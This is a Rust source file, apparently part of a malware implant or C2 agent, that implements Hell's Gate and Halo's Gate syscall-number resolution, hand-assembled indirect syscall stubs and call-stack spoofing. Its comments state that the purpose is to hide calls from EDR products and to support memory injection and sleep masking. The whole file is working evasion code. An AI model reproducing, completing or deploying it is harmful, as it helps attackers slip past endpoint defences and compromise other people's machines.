/// Hell's Gate + Halo's Gate — resolve SSNs from ntdll and call them via
/// direct `syscall` without going through the IAT or ntdll stubs.
///
/// Exposed syscalls:
///   - NtDelayExecution          (sleep masking)
///   - NtProtectVirtualMemory    (memory protection changes)
///   - NtWriteVirtualMemory      (injection)
///   - NtAllocateVirtualMemory   (injection)
///
/// Stack spoofing: 110-byte spoofed stubs plant a call-preceded RET gadget
/// address at [RSP] before the syscall so EDR call-stack views show ntdll.

use std::sync::OnceLock;
use std::arch::asm;

pub struct Gates {
    pub nt_delay_execution:        u32,
    pub nt_protect_virtual_memory: u32,
    pub nt_write_virtual_memory:   u32,
    pub nt_allocate_virtual_memory: u32,
}

static GATES: OnceLock<Gates> = OnceLock::new();

// ── Spoofed stubs ────────────────────────────────────────────────────────────

pub struct SpoofedStubs {
    pub nt_delay_execution:         usize,
    pub nt_protect_virtual_memory:  usize,
    pub nt_write_virtual_memory:    usize,
    pub nt_allocate_virtual_memory: usize,
    pub spoof_gadget:               usize,
}

static STUBS: OnceLock<SpoofedStubs> = OnceLock::new();

pub fn init_spoof() {
    if STUBS.get().is_some() { return; }
    let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
    let ntdll_base = unsafe {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
        GetModuleHandleW(ntdll_w.as_ptr()) as usize
    };
    if ntdll_base == 0 { return; }

    let syscall_gadget = unsafe { find_syscall_gadget(ntdll_base) };
    let spoof_gadget   = unsafe { find_spoof_gadget(ntdll_base) };
    if syscall_gadget == 0 || spoof_gadget == 0 { return; }

    // Allocate RW page for stubs
    let page = unsafe {
        use windows_sys::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
        VirtualAlloc(std::ptr::null(), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as usize
    };
    if page == 0 { return; }

    // Write 4 stubs — one for each Nt* function we expose
    let g = gates();
    let ssns = [
        g.nt_delay_execution,
        g.nt_protect_virtual_memory,
        g.nt_write_virtual_memory,
        g.nt_allocate_virtual_memory,
    ];
    let stubs_addrs: Vec<usize> = ssns.iter().enumerate().map(|(i, &ssn)| {
        let addr = page + i * 110;
        unsafe { write_spoofed_stub(addr, ssn, spoof_gadget, syscall_gadget); }
        addr
    }).collect();

    // Flip page to RX — use direct inline syscall (STUBS not set yet)
    unsafe {
        let mut base = page as *mut u8;
        let mut sz   = 0x1000usize;
        let mut old  = 0u32;
        let ssn = g.nt_protect_virtual_memory;
        asm!(
            "sub rsp, 0x28",
            "mov [rsp+0x20], {old}",
            "mov r10, rcx",
            "syscall",
            "add rsp, 0x28",
            old = in(reg) &mut old as *mut u32,
            in("eax")  ssn,
            in("rcx")  usize::MAX,
            in("rdx")  &mut base as *mut *mut u8,
            in("r8")   &mut sz as *mut usize,
            in("r9")   0x20u32 as usize, // PAGE_EXECUTE_READ
            lateout("rax") _,
            lateout("rcx") _,
            lateout("r11") _,
            options(nostack),
        );
    }

    let _ = STUBS.set(SpoofedStubs {
        nt_delay_execution:         stubs_addrs[0],
        nt_protect_virtual_memory:  stubs_addrs[1],
        nt_write_virtual_memory:    stubs_addrs[2],
        nt_allocate_virtual_memory: stubs_addrs[3],
        spoof_gadget,
    });
}

unsafe fn write_spoofed_stub(addr: usize, ssn: u32, spoof_gadget: usize, syscall_gadget: usize) {
    // 110-byte spoofed stub — same layout as Go hells_gate_windows.go:
    // +0   sub rsp, 8                    (4 bytes)
    // +4   7x arg-copy pairs (10b each) (70 bytes)
    // +74  mov r11, spoof_gadget         (10 bytes)
    // +84  mov [rsp], r11               (4 bytes)
    // +88  mov r10, rcx                 (3 bytes)
    // +91  mov eax, SSN                 (5 bytes)
    // +96  jmp [rip+0]                  (6 bytes)
    // +102 <syscall_gadget address>      (8 bytes)
    let s = std::slice::from_raw_parts_mut(addr as *mut u8, 110);

    s[0] = 0x48; s[1] = 0x83; s[2] = 0xEC; s[3] = 0x08; // sub rsp,8

    let arg_copies: [(u8, u8); 7] = [
        (0x30, 0x28), (0x38, 0x30), (0x40, 0x38), (0x48, 0x40),
        (0x50, 0x48), (0x58, 0x50), (0x60, 0x58),
    ];
    let mut off = 4usize;
    for (src, dst) in arg_copies {
        s[off..off+5].copy_from_slice(&[0x4C, 0x8B, 0x5C, 0x24, src]); // mov r11,[rsp+src]
        s[off+5..off+10].copy_from_slice(&[0x4C, 0x89, 0x5C, 0x24, dst]); // mov [rsp+dst],r11
        off += 10;
    }
    // off == 74
    s[74] = 0x49; s[75] = 0xBB;
    s[76..84].copy_from_slice(&(spoof_gadget as u64).to_le_bytes());
    s[84] = 0x4C; s[85] = 0x89; s[86] = 0x1C; s[87] = 0x24; // mov [rsp],r11
    s[88] = 0x4C; s[89] = 0x8B; s[90] = 0xD1;               // mov r10,rcx
    s[91] = 0xB8;
    s[92..96].copy_from_slice(&ssn.to_le_bytes());            // mov eax,SSN
    s[96] = 0xFF; s[97] = 0x25;
    s[98] = 0; s[99] = 0; s[100] = 0; s[101] = 0;           // jmp [rip+0]
    s[102..110].copy_from_slice(&(syscall_gadget as u64).to_le_bytes());
}

unsafe fn find_ntdll_text(base: usize) -> (usize, usize) {
    if *(base as *const u16) != 0x5A4D { return (0, 0); }
    let e_lfanew = *(base.wrapping_add(0x3c) as *const u32) as usize;
    let nt = base + e_lfanew;
    if *(nt as *const u32) != 0x0000_4550 { return (0, 0); }
    let num = *(nt.wrapping_add(6) as *const u16) as usize;
    let opt = *(nt.wrapping_add(20) as *const u16) as usize;
    let sec0 = nt + 4 + 20 + opt;
    for i in 0..num {
        let sec = sec0 + i * 40;
        let name = std::slice::from_raw_parts(sec as *const u8, 8);
        if name.starts_with(b".text") {
            let vsz  = *(sec.wrapping_add(8) as *const u32) as usize;
            let vadr = *(sec.wrapping_add(12) as *const u32) as usize;
            return (base + vadr, vsz);
        }
    }
    (0, 0)
}

unsafe fn find_syscall_gadget(ntdll_base: usize) -> usize {
    let (start, size) = find_ntdll_text(ntdll_base);
    if start == 0 { return 0; }
    // 0F 05 C3 = syscall; ret
    for i in 0..size.saturating_sub(2) {
        let p = (start + i) as *const u8;
        if *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3 {
            return start + i;
        }
    }
    0
}

unsafe fn find_spoof_gadget(ntdll_base: usize) -> usize {
    let (start, size) = find_ntdll_text(ntdll_base);
    if start == 0 { return 0; }
    // E8 xx xx xx xx C3 = call rel32 immediately followed by ret
    // Return address of C3 byte
    for i in 5..size {
        let c3_addr   = start + i;
        let call_addr = c3_addr - 5;
        if *(call_addr as *const u8) == 0xE8 && *(c3_addr as *const u8) == 0xC3 {
            return c3_addr;
        }
    }
    0
}

pub fn get_spoofed_stubs() -> Option<&'static SpoofedStubs> {
    STUBS.get()
}

/// Resolve SSNs at startup. Call once before any `nt_*` functions.
pub fn init() {
    GATES.get_or_init(|| unsafe { resolve() });
    init_spoof();
}

fn gates() -> &'static Gates {
    GATES.get_or_init(|| unsafe { resolve() })
}

/// Return the NtDelayExecution SSN without going through the full gates() path.
/// Used by evasion::sleep_masked() to copy the SSN to a stack variable BEFORE
/// XOR-masking .data (where GATES lives).
pub fn delay_ssn() -> u32 {
    gates().nt_delay_execution
}

// ── SSN resolution ────────────────────────────────────────────────────────────

unsafe fn resolve() -> Gates {
    let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
    let base = GetModuleHandleW(ntdll_w.as_ptr()) as usize;

    Gates {
        nt_delay_execution:         find_ssn(base, b"NtDelayExecution\0"),
        nt_protect_virtual_memory:  find_ssn(base, b"NtProtectVirtualMemory\0"),
        nt_write_virtual_memory:    find_ssn(base, b"NtWriteVirtualMemory\0"),
        nt_allocate_virtual_memory: find_ssn(base, b"NtAllocateVirtualMemory\0"),
    }
}

/// Read SSN from a ntdll export.  Returns a hard-coded fallback on failure so
/// the agent still compiles to a working binary even on patched systems.
unsafe fn find_ssn(ntdll: usize, name: &[u8]) -> u32 {
    // Fallback SSNs — correct for Windows 10/11 22H2 unpatched.
    let fallback: u32 = match name {
        b"NtDelayExecution\0"        => 0x34,
        b"NtProtectVirtualMemory\0"  => 0x50,
        b"NtWriteVirtualMemory\0"    => 0x3a,
        b"NtAllocateVirtualMemory\0" => 0x18,
        _ => 0xffff,
    };

    let exp = match export_dir(ntdll) {
        Some(e) => e,
        None => return fallback,
    };

    let n      = exp.num_names;
    let names  = (ntdll + exp.names_rva) as *const u32;
    let ords   = (ntdll + exp.ords_rva)  as *const u16;
    let fns    = (ntdll + exp.fns_rva)   as *const u32;

    for i in 0..n {
        let nm_ptr = (ntdll + *names.add(i) as usize) as *const u8;
        if !names_match(nm_ptr, name) { continue; }

        let ord    = *ords.add(i) as usize;
        let fn_rva = *fns.add(ord) as usize;
        let fn_ptr = (ntdll + fn_rva) as *const u8;

        if let Some(ssn) = read_ssn(fn_ptr) {
            return ssn;
        }
        // Halo's Gate: function is hooked (starts with JMP/CALL).
        // Scan neighbouring exports — they share the same stub template
        // and increment SSN by 1 for each position.
        return halo_scan(ntdll, fns, ords, n, i, fallback);
    }
    fallback
}

/// Try to extract the SSN from the bytes at fn_ptr.
/// Pattern: 4C 8B D1  B8 xx xx 00 00 (mov r10,rcx; mov eax,SSN)
unsafe fn read_ssn(fn_ptr: *const u8) -> Option<u32> {
    // Skip over a JMP if this is a forwarder or trampoline to another stub
    let p = if *fn_ptr == 0xE9 {
        // Relative JMP: dest = fn_ptr + 5 + i32_offset
        let offset = *(fn_ptr.add(1) as *const i32);
        fn_ptr.add(5).offset(offset as isize)
    } else {
        fn_ptr
    };

    if *p == 0x4c && *p.add(1) == 0x8b && *p.add(2) == 0xd1 && *p.add(3) == 0xb8 {
        let ssn = *(p.add(4) as *const u32);
        if ssn < 0x1000 { return Some(ssn); } // sanity check
    }
    None
}

/// Halo's Gate: scan exports ±16 positions to find an unhooked neighbour,
/// then derive our target SSN from the neighbour SSN ± distance.
unsafe fn halo_scan(
    ntdll: usize,
    fns: *const u32,
    ords: *const u16,
    n: usize,
    hooked_idx: usize,
    fallback: u32,
) -> u32 {
    for delta in 1usize..=16 {
        for &offset in &[delta as isize, -(delta as isize)] {
            let j = hooked_idx as isize + offset;
            if j < 0 || j as usize >= n { continue; }
            let ord    = *ords.add(j as usize) as usize;
            let fn_rva = *fns.add(ord) as usize;
            let fn_ptr = (ntdll + fn_rva) as *const u8;
            if let Some(ssn) = read_ssn(fn_ptr) {
                // Adjust: target SSN = neighbour SSN - delta_from_neighbour_to_target
                // (SSNs are assigned in export-table address order, monotonically increasing)
                let target_ssn = ssn.wrapping_add_signed(-(offset as i32));
                return target_ssn;
            }
        }
    }
    fallback
}

struct ExportDir {
    num_names: usize,
    names_rva: usize,
    ords_rva:  usize,
    fns_rva:   usize,
}

unsafe fn export_dir(base: usize) -> Option<ExportDir> {
    if *(base as *const u16) != 0x5A4D { return None; } // MZ
    let e_lfanew = *(base.wrapping_add(0x3c) as *const u32) as usize;
    let nt = base + e_lfanew;
    if *(nt as *const u32) != 0x0000_4550 { return None; } // PE
    // DataDirectory[0].VirtualAddress is at: nt + 4 (sig) + 20 (FileHeader) + 112 (OptHdr fields)
    let exp_rva = *(nt.wrapping_add(4 + 20 + 112) as *const u32) as usize;
    if exp_rva == 0 { return None; }
    let exp = base + exp_rva;
    Some(ExportDir {
        num_names: *(exp.wrapping_add(24) as *const u32) as usize, // NumberOfNames
        fns_rva:   *(exp.wrapping_add(28) as *const u32) as usize, // AddressOfFunctions
        names_rva: *(exp.wrapping_add(32) as *const u32) as usize, // AddressOfNames
        ords_rva:  *(exp.wrapping_add(36) as *const u32) as usize, // AddressOfNameOrdinals
    })
}

unsafe fn names_match(ptr: *const u8, name: &[u8]) -> bool {
    for (i, &b) in name.iter().enumerate() {
        if *ptr.add(i) != b { return false; }
    }
    true
}

// ── Indirect syscall wrappers ─────────────────────────────────────────────────

/// NtDelayExecution(Alertable=FALSE, Interval=negative_100ns_units)
/// `ms` — milliseconds to sleep.
/// Uses spoofed stub when available; falls back to direct inline syscall.
pub unsafe fn nt_delay_execution(ms: u64) {
    if let Some(stubs) = STUBS.get() {
        if stubs.nt_delay_execution != 0 {
            let f: unsafe extern "system" fn(u32, *mut i64) -> i32
                = std::mem::transmute(stubs.nt_delay_execution);
            let mut iv: i64 = -(ms as i64 * 10_000);
            f(0, &mut iv);
            return;
        }
    }
    // Fallback: direct inline syscall
    let ssn = gates().nt_delay_execution;
    let mut interval: i64 = -(ms as i64 * 10_000);
    asm!(
        "mov r10, rcx",
        "syscall",
        in("eax") ssn,
        in("rcx") 0usize,
        in("rdx") &mut interval as *mut i64,
        lateout("rcx") _,
        lateout("r11") _,
        options(nostack),
    );
}

/// NtProtectVirtualMemory — 5-arg syscall.
/// Returns NTSTATUS (0 = success).
/// Uses spoofed stub when available; falls back to direct inline syscall.
pub unsafe fn nt_protect_virtual_memory(
    handle:   usize,
    base_ptr: *mut *mut u8,
    size_ptr: *mut usize,
    new_prot: u32,
    old_prot: *mut u32,
) -> i32 {
    if let Some(stubs) = STUBS.get() {
        if stubs.nt_protect_virtual_memory != 0 {
            let f: unsafe extern "system" fn(usize, *mut *mut u8, *mut usize, u32, *mut u32) -> i32
                = std::mem::transmute(stubs.nt_protect_virtual_memory);
            return f(handle, base_ptr, size_ptr, new_prot, old_prot);
        }
    }
    // Fallback: direct inline syscall (existing asm)
    let ssn = gates().nt_protect_virtual_memory;
    let mut result: i32;
    // 5th arg goes at [rsp+0x28] per Windows x64 syscall convention.
    // We reserve shadow space + arg5 slot and write it manually.
    asm!(
        "sub rsp, 0x28",          // shadow space (0x20) + arg5 slot (0x08)
        "mov [rsp+0x20], {old}",  // arg5 = old_prot pointer
        "mov r10, rcx",
        "syscall",
        "add rsp, 0x28",
        old = in(reg) old_prot,
        in("eax")  ssn,
        in("rcx")  handle,
        in("rdx")  base_ptr,
        in("r8")   size_ptr,
        in("r9")   new_prot as usize,
        lateout("rax") result,
        lateout("rcx") _,
        lateout("r11") _,
        options(nostack),
    );
    result
}
